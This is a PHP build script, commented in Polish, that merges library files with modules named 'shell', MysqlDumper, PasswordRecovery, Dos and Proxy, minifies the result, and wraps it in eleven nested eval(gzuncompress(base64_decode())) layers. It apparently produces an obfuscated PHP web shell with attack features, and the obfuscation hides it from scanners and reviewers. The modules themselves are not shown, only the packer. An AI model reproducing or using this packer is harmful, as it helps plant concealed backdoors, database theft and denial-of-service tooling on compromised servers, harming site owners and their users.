<?php

$sFilePath = __DIR__ . '/Tmp/prod.php';

$sData = "<?php\r\n";

$aFiles = array( 'LibProd/Arr', 'LibProd/Form', 'LibProd/Request' );
if( isset( $argv[1] ) && ( $argv[1] !== 'lite' ) )
{
	$aFiles = array_merge( $aFiles, array( 'LibProd/ModuleMysqlDumper', 'LibProd/ModulePasswordRecovery', 'LibProd/ModuleDos', 'LibProd/ModuleProxy' ) );
}
$aFiles = array_merge( $aFiles, array( 'shell' ) );

foreach( $aFiles as $sFile )
{
	$sData .= file_get_contents( $sFile . '.php', NULL, NULL, 6 );
}


$sData = preg_replace( '~^require_once.+?[\r\n]+~m', NULL, $sData ) . "?>";



/**
 * Wyrazenie " ! " -> "!"
 */
$sData = preg_replace( '~\s\!\s~', '!', $sData );

/**
 * Wyrazenie " && " -> "&&"
 */
$sData = preg_replace( '~\s\&&\s~', '&&', $sData );
/**
 * Wyrazenie " || " -> "||"
 */
$sData = preg_replace( '~\s\\|\|\s~', '||', $sData );

/**
 * Operator trojskladnikowy
 */
$sData = preg_replace( '~\s+\?\s~', '?', $sData );
$sData = preg_replace( '~\s+\:\s~', ':', $sData );

/**
 * Usuwanie komentarzy
 */
$sData = preg_replace( '~/\*(.+?)\*/~s', NULL, $sData );

/**
 * Usuwanie tabualtorow
 */
//$sData = preg_replace( '~\t~s', NULL, $sData );

/**
 * Redukcja \r\n
 */
$sData = preg_replace( '~[\r\n]{2,}~', "\r\n", $sData );

/**
 * Redukcja spacji
 */
$sData = preg_replace( '~ {2,}~', "\r\n", $sData );

/**
 * Tablica $mConfig[ $sParam ] -> $mConfig[$sParam]
 */
$sData = preg_replace( '~\[\s+(.+?)\s+\]~s', '[$1]', $sData );

/**
 * Tablica - przypisanie  'key' => 5 -> 'key'=>5
 */
$sData = preg_replace( '~\s+=>\s+~', '=>', $sData );

/**
 * Obiekty $this -> prop    -> $this->prop
 */
$sData = preg_replace( '~\s+->\s+~', '->', $sData );

/**
 * private $a;
 * private $b;
 *  ->
 * private $a;private $b;
 */
$sData = preg_replace( '~[\r\n]+(private|public|protected)\s+\$~', '$1 $', $sData );
$sData = preg_replace( '~[\r\n]+(private|public|protected)\s+static\s+\$~', '$1 static $', $sData );

/**
 * Zmienne $a = 5; -> $a=5;
 */
$sData = preg_replace( '~(\$(this->)?[a-zA-z0-9_]+)\s+=\s+~', '$1=', $sData );

/**
 * Wyrażenie (musi byc 2 razy
 * if( isset( $mConfig[$sParam] ) ) -> if(isset($mConfig[$sParam]))
 */
$sData = preg_replace( '~\(\s+?(.+?)\s+\)~s', '($1)', $sData );
$sData = preg_replace( '~\(\s+(.+?)\s+?\)~s', '($1)', $sData );
$sData = preg_replace( '~\(\s+?(.+?)\s+\)~s', '($1)', $sData );
$sData = preg_replace( '~\(\s+(.+?)\s+?\)~s', '($1)', $sData );
$sData = preg_replace( '~\(\s+(.+?)\s+\)~s', '($1)', $sData );

/**
 * Wyrażenie if( $a === 5 ) -> if( $a===5 )
 */
$sData = preg_replace( '~\s+(!|=)=?=\s+~', '$1==', $sData );

/**
 * Kontatenacja $s = 'test' . $var . "test2"; -> $s = 'test'.$var."test2";
 */
$sData = preg_replace( '~(\'|")\s+\.\s+~', '$1.', $sData );
$sData = preg_replace( '~\s+\.\s+(\'|")~', '.$1', $sData );

/**
 * Usuwanie znakow nowej lini przed i za znakami '{' '}'
 */
$sData = preg_replace( '~[\r\n]+{[\r\n]+~', '{', $sData );

/**
 * Usuwanie linii
 */
$sData = preg_replace( '~(_GET|_POST|_SERVER|_FILES|null|true);[\r\n]+~i', '$1;', $sData );

$sData = preg_replace( '~\';[\r\n+]~i', '\';', $sData );
file_put_contents( $sFilePath, $sData );
$sData = '?>' . $sData . '<?';

for( $i = 0; $i < 10; $i++ )
{
	$sData = sprintf( "eval(gzuncompress(base64_decode('%s')));", base64_encode( gzcompress( $sData, 9 ) ) );
}

file_put_contents( __DIR__ . '/Tmp/final.php', sprintf( "<?php eval(gzuncompress(base64_decode('%s')));", base64_encode( gzcompress( $sData, 9 ) ) ) );
exit;